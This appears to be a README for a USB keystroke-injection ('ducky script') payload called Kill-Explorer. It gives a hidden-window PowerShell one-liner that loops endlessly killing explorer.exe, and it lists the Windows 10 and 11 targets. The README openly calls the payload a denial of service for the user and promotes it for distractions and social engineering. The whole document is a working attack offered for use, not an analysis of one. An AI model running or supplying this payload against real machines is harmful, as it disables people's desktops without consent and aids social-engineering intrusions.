# Kill-Explorer
A ducky script that kills explorer.exe repeatedly resulting in loss of Windows Desktop functionality. The command executed is a simple Denial of Service for the intended user.
## Configuration
1. Execute on windows 10 or Windows 11.
2. Logoff or restart to reset your windows session.
## Notes
A great tool for distractions or social engineering.
## Windows Command (used in payload)
```Powershell
powershell /w 1 while($true){kill -name explorer}
```
